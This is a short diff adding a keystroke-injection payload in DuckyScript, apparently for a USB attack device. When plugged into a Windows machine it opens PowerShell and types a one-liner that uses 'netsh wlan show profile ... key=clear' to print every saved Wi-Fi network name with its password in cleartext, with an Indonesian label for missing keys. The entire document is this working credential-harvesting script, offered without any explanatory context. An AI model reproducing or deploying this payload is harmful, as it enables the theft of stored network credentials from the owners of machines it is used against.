@@ -1,0 +1,7 @@
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell
+ENTER
+DELAY 1000
+STRING (netsh wlan show profiles | sls "All User Profile") | % { $n = ($_.Line -split ":",2)[1].Trim(); $pass = netsh wlan show profile name="$n" key=clear | sls "Key Content"; $password = if ($pass) { ($pass.Line -split ":",2)[1].Trim() } else { "(tidak tersimpan)" }; "{0,-30} {1}" -f $n, $password }
